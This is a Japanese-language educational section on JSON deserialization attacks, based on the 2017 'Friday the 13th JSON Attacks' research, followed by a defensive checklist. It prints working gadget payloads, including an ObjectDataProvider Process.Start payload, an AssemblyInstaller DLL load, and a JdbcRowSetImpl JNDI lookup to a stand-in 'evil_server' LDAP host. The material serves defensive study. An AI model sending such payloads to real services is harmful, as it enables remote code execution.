## JSON系シンクの盲点（Friday the 13th JSON Attacks）

### この節のねらい

Javaのネイティブシリアライズ（`ObjectInputStream.readObject()`）や.NETの`BinaryFormatter`が危険であることは広く知られるようになった。その結果、多くの開発者は「バイナリのネイティブ形式をやめてJSONにすればデシリアライズ攻撃は防げる」と考えた。本節が扱うMuñoz & Miroshの研究「Friday the 13th JSON Attacks」（Black Hat / DEF CON 25, 2017）は、この**素朴な安心感が誤り**であることを示した。ここでいう「シンク（sink＝攻撃者が制御した入力が最終的に実行・解釈される危険な到達点）」は、JSONライブラリが**攻撃者の指定した型を復元し、その型のsetter・コンストラクタ・型変換器を呼び出す箇所**である。JSONというテキスト形式そのものは無害でも、そこに「どのクラスを作れ」という情報（**型ディスクリミネータ**）が混ざると、ネイティブシリアライズと同じRCE（Remote Code Execution）が成立してしまう。

> ⚠️ **未取得の資料**: 「Friday the 13th JSON Attacks（DEF CON 25 スライドPDF）」は自動取得できませんでした（理由: infocon.orgへの接続が `read ECONNRESET` で切断された）。以下のURLからご自身で直接ご覧ください: https://infocon.org/cons/DEF%20CON/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEF%20CON%2025%20-%20Alvaro-Munoz-JSON-attacks.pdf
>
> ⚠️ **未取得の資料**: 「Friday the 13th: Attacking JSON（動画, AppSecUSA 2017）」は自動取得できませんでした（理由: YouTubeページからは字幕・トランスクリプトが取得できずナビゲーション要素のみが返る）。以下のURLからご自身で直接ご覧ください: https://www.youtube.com/watch?v=NqHsaVhlxAQ
>
> （以下は未取得資料の補足として一般知識に基づく解説です。スライドと動画は、同じ著者による同一研究の発表であり、内容は本節が全文取得できたBlack Hat白書（PDF）とほぼ一致する。白書がすべての図表・コード・ガジェットを含む最も詳細な資料であるため、本節は白書を主たる出典として記述する。）

---

### 攻撃が成立する3つの条件

著者らは、シリアライズ形式（JSON・XML・バイナリを問わない）が攻撃可能となる普遍的な条件を次の3点に整理した。これは本節の背骨なので最初に押さえてほしい。

1. **攻撃者が「復元される型」を制御できる**こと（型ディスクリミネータの注入）。
2. **復元されたオブジェクトに対して何らかのメソッドが呼ばれる**こと（setter・コンストラクタ・コールバック・型変換器など）。
3. **利用可能なガジェット空間が十分広い**こと。すなわち、呼ばれるメソッドを起点にコード実行まで連鎖（gadget chain）できる「都合のよいクラス」がクラスパス／GACに存在すること。

重要なのは、**この3条件は形式に依存しない**という結論である。「JSONだから」「テキストだから」安全にはならない。著者らは同じガジェットがJSON・XML・バイナリ・独自形式のいずれでも動くことを実証した。

> 出典: Friday the 13th JSON Attacks（Munoz & Mirosh, HPE Security Research, Black Hat July 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### なぜ「コールバックが無い＝安全」ではないのか（アンマーシャラの内部動作）

Javaの`readObject()`や.NETの`BinaryFormatter`が危険なのは、デシリアライズ中に**デシリアライズコールバック**（`readObject`、`IDeserializationCallback.OnDeserialization`など）が呼ばれ、その中で攻撃者制御のデータを使った処理が走るからだった。JSONライブラリは一般にこうしたコールバックの概念を持たないため、「安全そう」に見える。しかし著者らは、コールバックが無くても**オブジェクトを復元する過程で必ず何らかのメソッドが呼ばれる**点を突く。JSONアンマーシャラが`Java`/`.NET`オブジェクトを再構築する方式は主に3つある。

**(1) デフォルトコンストラクタ＋リフレクション**
引数なしコンストラクタでメモリを確保し、リフレクションでフィールドに値を直接書き込む方式（JSON-IOや「古典的」.NETデシリアライザなど）。「メソッドを呼ばないから安全そう」に見えるが、実際には次の抜け道がある。
- **デストラクタ**（例: `Finalize()`）はガベージコレクタが必ず呼ぶ。
- リフレクションで復元できない型（例: .NETの`Hashtable`はマシン/OSでハッシュ値が変わるため再計算が必要）があり、その過程で`HashCode()` `Equals()` `Compare()`などが呼ばれる。
- 例外ハンドラ経由で`toString()`が呼ばれることが多い。

**(2) デフォルトコンストラクタ＋setter**
引数なしコンストラクタで生成後、**publicなプロパティ／フィールドのsetterを呼んで**値を埋める方式。著者らが分析したJSONライブラリの**大半がこの方式**であり、setterが呼ばれることこそが本研究の中心的な攻撃面になる。

ここで.NETとJavaの違いが効いてくる。.NETは真のプロパティ（getter/setter）を言語機能として持つが、**Javaの「getter/setter」は単なる命名規約**にすぎない。「`set`で始まり引数1つ」という形さえ満たせば、ライブラリはそれを「setter」とみなして呼んでしまう。バッキングフィールドを持たない`setup()`のようなメソッドすら「setter」として起動され得る。この緩さが、後述の`JdbcRowSetImpl.setAutoCommit()`のような「setterに見えないsetter」ガジェットを可能にする。

**(3) 特殊コンストラクタ／デシリアライズコールバック**
`ISerializable`用の特殊コンストラクタ、`[OnDeserialized]`/`[OnDeserializing]`注釈メソッド、`IXmlSerializable`の`ReadXml()`など。JSONライブラリでこれを橋渡しするものは少数だが存在する。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### 型ディスクリミネータという「鍵」

攻撃の入口は、JSONに埋め込まれる**型ディスクリミネータ（type discriminator）**である。これは「この値をどのクラスに復元すべきか」をパーサに伝えるメタ情報で、ライブラリごとにキー名が異なる。

| キー | 主なライブラリ |
|---|---|
| `$type` | Json.NET、FastJSON、Sweet.Jayson など（.NET） |
| `@class` | JSON-IO、Genson など（Java） |
| `@type` / 任意プロパティ名 | Jackson（`@JsonTypeInfo`のproperty指定次第） |
| `__type` | 一部の.NETコンポーネント（例: WPFの`ResourceDictionary`連鎖）|

型ディスクリミネータが有効になるトリガーは2種類ある。**(a) デフォルトで常に有効**なライブラリ（FastJSON、Sweet.Jayson、JSON-IO、FlexSONなど）と、**(b) 設定で有効化**するライブラリ（Json.NETの`TypeNameHandling`、Jacksonの`enableDefaultTyping()`など）。前者は「untrustedデータに使ってはいけない」ものであり、後者は「安全でない設定にしなければ大丈夫」だが、多相性（polymorphism）を扱うために有効化されがちである。

さらに**型制御（Type Control）**の強さでも危険度が分かれる。
- **キャストのみ（弱い）**: いったん任意の型を復元し「終わってから」期待型へキャストする。キャスト例外が出る頃にはペイロードは既に実行済み。
- **期待型オブジェクトグラフ検査（弱い/強い）**: 期待型のメンバに代入可能な型だけ許すが、`Object`型メンバや非ジェネリックコレクションなど「何でも入る入口」が期待型グラフ内にあれば依然として攻撃可能。

著者らがまとめたライブラリ一覧（白書のTable）を要約する。

| ライブラリ | 言語 | 型ディスクリミネータ | 型制御 | 攻撃ベクトル |
|---|---|---|---|---|
| FastJSON | .NET | デフォルト | キャスト | setter |
| Json.Net | .NET | 設定 | 期待型グラフ検査（弱） | setter / コールバック / 型変換器 |
| FSPickler | .NET | デフォルト | 期待型グラフ検査（弱） | setter / コールバック |
| Sweet.Jayson | .NET | デフォルト | キャスト | setter |
| JavaScriptSerializer | .NET | 設定 | キャスト | setter |
| DataContractJsonSerializer | .NET | デフォルト | 期待型グラフ検査（強） | setter / コールバック |
| Jackson | Java | 設定 | 期待型グラフ検査（弱） | setter |
| Genson | Java | 設定 | 期待型グラフ検査（弱） | setter |
| JSON-IO | Java | デフォルト | キャスト | toString |
| FlexSON | Java | デフォルト | キャスト | setter |

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### Json.NETの `TypeNameHandling` を深掘りする

.NETで最も普及したJSONライブラリはJson.NET（Newtonsoft、白書時点でNuGet 6千万DL超）である。デフォルトでは型ディスクリミネータを**出力しない＝安全**だが、次のように`TypeNameHandling`を`None`以外にすると`$type`を解釈するようになる。

```csharp
var deser = JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
});
```

あるいは特定プロパティに注釈を付ける形でも有効化される。

```csharp
[JsonProperty(TypeNameHandling = TypeNameHandling.All)]
public object Body { get; set; }
```

`TypeNameHandling`の値の意味は次の通り。**なぜ危険か**を理解する鍵は「型名を読む＝攻撃者が型を制御できる」という点にある。

| 値 | 数値 | 意味 |
|---|---|---|
| `None` | 0 | 型名を出力しない（唯一、untrustedデータに使ってよい値） |
| `Objects` | 1 | JSONオブジェクトに型名を含める |
| `Array` | 2 | JSON配列に型名を含める |
| `All` | 3 | 常に型名を含める |
| `Auto` | 4 | 宣言型と実型が異なるときだけ型名を含める |

Json.NETは「期待型に代入可能か」を検査するため一見安全に見える。しかし著者らは、期待型グラフ内に**次のいずれかを満たすメンバ**があれば依然として攻撃者が任意ガジェット型を注入できると指摘する。

- `System.Object`（Javaなら`java.lang.Object`）型のメンバ。
- 非ジェネリックコレクション（`ArrayList`、`Hashtable`など）。
- `IDynamicMetaObjectProvider`実装型。
- `System.Data.EntityKeyMember`またはその派生型（`EntityKeyMemberConverter`という**型変換器**経由で、`TypeNameHandling=None`でも攻撃が成立する特殊ケース）。

この検査は各プロパティについて**再帰的**に行われるため、利用可能な型の表面積は爆発的に広がり、開発者が安全に制御するのは非現実的である。

**実例: Breeze（CVE-2017-9424）** — .NETのデータ管理バックエンドフレームワークBreezeは`TypeNameHandling.All`を使う設定で、HTTP/JSON通信の型情報を攻撃者が改変できた。期待型`SaveOptions`が`public object Tag`という`Object`型プロパティを持っていたため、そこにガジェットを注入できた。**この脆弱性は設定や公開エンドポイントに関係なく全ユーザーに影響した**。報告(5/29)から**わずか2日**でv1.6.5(6/1)で修正された。

```csharp
public class SaveOptions {
    public bool AllowConcurrentSaves { get; set; }
    public Object Tag { get; set; }   // ← Object型が「何でも入る入口」になる
}
```

untrustedデータを扱う場合、Json.NETでは**`None`以外の`TypeNameHandling`を使わない**か、`SerializationBinder`で受け入れ型をホワイトリスト検証する以外に安全策はない。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### Java側: Jackson の `enableDefaultTyping()`

Java最普及のJacksonも、デフォルトでは型情報を出さないが、多相型や`Object`を扱うために有効化されがちである。

```java
// DefaultTyping.OBJECT_AND_NON_CONCRETE がデフォルト
objectMapper.enableDefaultTyping();
```

あるいはフィールド注釈で。

```java
@JsonTypeInfo(use=JsonTypeInfo.Id.CLASS,
             include=JsonTypeInfo.As.PROPERTY, property="@class")
public Object message;
```

`use=Id.CLASS`は「JSON内のクラス名(`@class`)をそのまま`Class.forName`相当で解決する」ことを意味し、これが攻撃者による型制御を許す。防御としては、**そもそも型情報を有効にしない**こと、必要なら`@JsonTypeInfo`を必要フィールドだけに限定し、`use`に`Id.CLASS`以外（`Id.NAME`＋明示的サブタイプ登録）を使うことが推奨される。この設計思想は後年のJacksonの「Polymorphic Type Handling無効化・`PolymorphicTypeValidator`必須化」（2.10以降, 2019〜）へと繋がっていく。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### エントリポイント探索（期待型オブジェクトグラフ）

型制御が「期待型グラフ検査」の場合、攻撃者はペイロードを置ける**エントリポイント（injection point）**を期待型のグラフ内から探す必要がある。著者らが挙げる探し方は次の通り。

- `Hashtable`・`ArrayList`など.NET非ジェネリックコレクション。
- `java.lang.Object` / `System.Object` 型メンバ。
- ジェネリック型（例: `Message<T>`）。
- **派生型で表面積を拡大**する: 例えば期待型が`System.Exception`なら、派生型`System.ComponentModel.DataAnnotations.ValidationException`は`System.Object`プロパティを持つのでそこに任意ガジェットを置ける（Javaでは`javax.management.InvalidApplicationException`が`Object`フィールドを持つ）。
- 親型のプロパティを使う。

これらは**再帰的**に適用できるため、期待型が具体的でも実質的に攻撃者は広い型空間を得る。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### .NET RCEガジェット（setter起点）

著者らはGAC（Global Assembly Cache）に存在する＝**第三者依存なしで使える**ガジェットを複数発見した。JSON経由でsetterが呼ばれることを利用する。以下は原典のペイロードだが、いずれも「なぜコード実行に至るか」を仕組みで理解することが目的であり、実在サービスや本番への無許可検証に用いてはならない。

**AssemblyInstaller** — `Path`のsetterが`Assembly.LoadFrom(value)`を呼ぶ。任意アセンブリをロードさせ、その`DllMain`や`[RunInstaller(true)]`型の静的コンストラクタでコードを走らせる。

```json
{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
 "Path":"file:///c:/somePath/MixedLibrary.dll"}
```
理由: `set_Path`の内部が`this.assembly = Assembly.LoadFrom(value);`となっており、setterに値を入れるだけでアセンブリロード（＝コード実行機会）が発生するため。

**ObjectDataProvider（本命の万能ガジェット）** — 最も柔軟で、ほぼ全アンマーシャラで使える。`ObjectType`＋`MethodName`＋`MethodParameters`を指定すると、内部で`_objectType.InvokeMember(MethodName, ..., array, ...)`が実行され、**任意の型の任意メソッドを任意引数で呼べる**。

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
 "MethodName":"Start",
 "MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["calc"]},
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}
```
理由: `set_MethodName`や`set_ObjectInstance`のsetterが内部で`base.Refresh()`→`QueryWorker()`→`InvokeMethodOnInstance()`を連鎖的に呼び、最終的に`InvokeMember`でリフレクション呼び出しに到達する。上例は`Process.Start("calc")`という**無害な検証用**の形。これが「setterを呼ぶだけで任意メソッド実行に化ける」ObjectDataProviderの本質である。

その他の.NETガジェット（仕組みのみ要約）:
- **WorkflowDesigner** — `set_PropertyInspectorFontAndColorData`がXAML文字列を`XamlReader.Load`でパースし、XAML内の`ObjectDataProvider`で静的メソッドを実行（STAスレッド要）。JSON→XAML→SSTI的連鎖の好例。
- **ResourceDictionary**（`__type`）— `set_Source`が任意URLへ`WebRequest`を投げ、応答が`application/xaml+xml`ならXAMLをロード。**外部サーバからXAMLペイロードを取得して実行**する。
- **BindingSource** — `set_DataSource`→`ResetList()`→任意getter呼び出し（`AssemblyInstaller`等へ連鎖）。
- **ExchangeSettingsProvider** — `set_ByteData`の内部で`new BinaryFormatter().Deserialize(...)`を呼ぶ。**JSONのsetterからネイティブ`BinaryFormatter`へ「橋渡し」**でき、JSON→バイナリデシリアライズの合流点になる。
- **TypeConverters** — `[TypeConverter]`注釈型の`ConvertFrom()`経由。例: `XamlSerializationWrapperConverter`はXAMLをロード、`EndpointCollectionConverter`はBase64→`BinaryFormatter.Deserialize`へ橋渡し。`EntityKeyMemberConverter`は前述の通り`TypeNameHandling=None`でも効く。

**PSObject（CVE-2017-8565系, PowerShell）** — PowerShell v3以降がインストールされた環境のGACに存在。`PSObject`のシリアライズコンストラクタが`CliXml`文字列を取り出し`PSSerializer.Deserialize(text)`で**二段目のデシリアライズ**を起動する。内部の`LanguagePrimitives.ConvertTo`が、攻撃者指定型の1引数コンストラクタ呼び出し・setter呼び出し・静的`Parse(string)`呼び出しといった変換を試み、最終的に`XamlReader.Parse()`で任意XAML（＝`Process.Start("calc.exe")`など）を実行できる。PowerShellが標準搭載される現代のWindowsで広く効く点が脅威。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### Java RCEガジェット

**JdbcRowSetImpl.setAutoCommit()（最重要, JRE標準）** — JavaランタイムのGACに相当する標準クラスにあり**外部依存不要**。`autoCommit`というフィールドは実在しないが、Jacksonやgensonは`"autoCommit"`属性を見ると`setAutoCommit()`を呼ぶ。その内部が`InitialContext().lookup(dataSourceName)`を実行するため、攻撃者のLDAP/RMIサーバへJNDIルックアップさせられる（JNDIインジェクション→リモートクラスロード→RCE）。

```json
{"@class":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://evil_server/uid=somename,ou=someou,dc=somedc",
 "autoCommit":true}
```
理由: `setAutoCommit(true)`→`connect()`→`ctx.lookup(getDataSourceName())`という流れで、`dataSourceName`のsetterに入れた値がそのままJNDIルックアップ先になるため。「setterに見えないが命名規約上setterとして呼ばれる」典型例。

その他のJavaガジェット:
- **hibernate `StatisticsService.setSessionFactoryJNDIName`** — setterが`InitialContext().lookup()`を呼ぶ。hibernate 3.1〜4.2系などに存在。
- **`antlr StringTemplate.toString`** — `toString`起点で任意getterを呼び、`TemplatesImpl.getOutputProperties()`等へ連鎖。
- **`atomikos RemoteClientUserTransaction.toString`** — `toString()`→`checkSetup()`→`InitialContext.lookup(name_)`でJNDI。

**JNDI攻撃ベクトルの注意（時事性）**: JDK update 121（2017, CVE対応）以降、RMIレジストリ/COSネーミング経由のリモートクラスロードはデフォルト無効化された。しかし当時**LDAPベクトルは依然有効**であった（その後8u191等で`com.sun.jndi.ldap.object.trustURLCodebase=false`がデフォルト化され塞がれていく）。JNDIガジェットの可否は**JREのバージョンとパッチ状況に強く依存**するため、評価時は必ず対象バージョンを確認すること。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### 自作パーサ・ラッパーの落とし穴

著者らは「暗号と同じで、仕組みを理解せず独自シリアライズ形式を作るな」と警告する。

**NancyFX（CVE-2017-9785）** — Ruby Sinatra風のWebフレームワーク。CSRF対策クッキー`NCSRF`が`CsrfToken`を`BinaryFormatter`でシリアライズ＋Base64したものだった。攻撃者は`PSObject`ペイロードをBase64化してクッキーに入れるだけでRCEできた（報告4/24、修正7/14）。興味深いことに、.NET Core対応のため2.x系が独自JSONパーサへ移行した後も、そのJSONに`"TypeObject":"Nancy.Security.CsrfToken, Nancy, ..."`という**型ディスクリミネータ**が含まれ、setterが呼ばれるため同じ攻撃が成立した。**バイナリからJSONへ変えても本質的問題は消えない**ことの好例。

**DotNetNuke（CVE-2017-9822）** — 未ログインユーザーのセッションを保存する`DNNPersonalization`クッキーが独自XMLで、`item`タグの`type`属性から期待型を取り`XmlSerializer`デシリアライザを生成していた。攻撃者が期待型を`List<Process, ObjectDataProvider>`のようなパラメトリック型にすることで`XmlSerializer`に任意型を「学習」させ、`ObjectDataProvider`ガジェットでコード実行に至った（報告6/1、修正7/6）。ここでも**型を攻撃者が制御できること**が核心であり、payloadの詳細な手順は防御学習の範囲を超えるため本書では扱わない。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

---

### 防御（開発者・レビュアー向けチェックリスト）

原典の結論を、実務で使える形に落とし込むと次のようになる。

1. **untrustedデータでは型ディスクリミネータを絶対に有効化しない。**
   - Json.NET: `TypeNameHandling`は`None`のみ。多相性が必要なら`SerializationBinder`（近年は`ISerializationBinder`）で**受け入れ型をホワイトリスト**化。
   - Jackson: `enableDefaultTyping()`を使わない。必要なら`@JsonTypeInfo`を最小限にし、`Id.CLASS`を避け、`PolymorphicTypeValidator`（2.10+）でホワイトリスト検証。
   - `@class`/`$type`/`__type`を**デフォルトで解釈するライブラリ**（FastJSON、Sweet.Jayson、JSON-IO、FlexSON、FSPickler、Hyperion、SharpSerializer等）はuntrustedデータに**使わない**。
2. **期待型を攻撃者に制御させない。** `DataContractSerializer`/`XmlSerializer`は期待型が固定なら比較的安全だが、`Type.GetType(userInput)`のように**入力から期待型を作る**コードは即座に脆弱化する（DotNetNukeパターン）。コード中の`Type.GetType`／`Class.forName`と入力の結び付きを監査せよ。
3. **`Object`型・非ジェネリックコレクション・弱い型リゾルバを排除する。** これらは期待型グラフ内の「何でも入る入口」になる。
4. **独自シリアライズ形式・ラッパーを作らない。** どうしても必要なら、型を一切信頼せず固定スキーマ＋明示的マッピングにする。
5. **JNDI・アセンブリロード・XAMLロードを行う「セキュリティ上センシティブな入口」を把握する。** setter1つがこれらを起動しうる。
6. **多層防御**: JRE/. NETランタイムを最新に保つ（JNDIリモートクラスロードのデフォルト無効化など）、デシリアライズ処理を最小権限・ネットワーク隔離環境で動かす。

**結論**: シリアライザ（アンマーシャラ）は暗号と同じ「セキュリティ上センシティブなAPI」であり、untrustedデータに使ってはならない。これはJava固有でも特定.NETフォーマッタ固有でもなく、JSON・XML・バイナリ・独自形式を問わない普遍的な問題である。すべてのシリアライザはオブジェクトを再構築するために何らかのメソッドを呼び、攻撃者はそれを起点にガジェット連鎖を組み立てる。「JSONだから安全」という思い込みこそが、この攻撃クラスが長く見逃されてきた最大の理由だった。

> 出典: Friday the 13th JSON Attacks（Munoz & Mirosh, Black Hat July 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
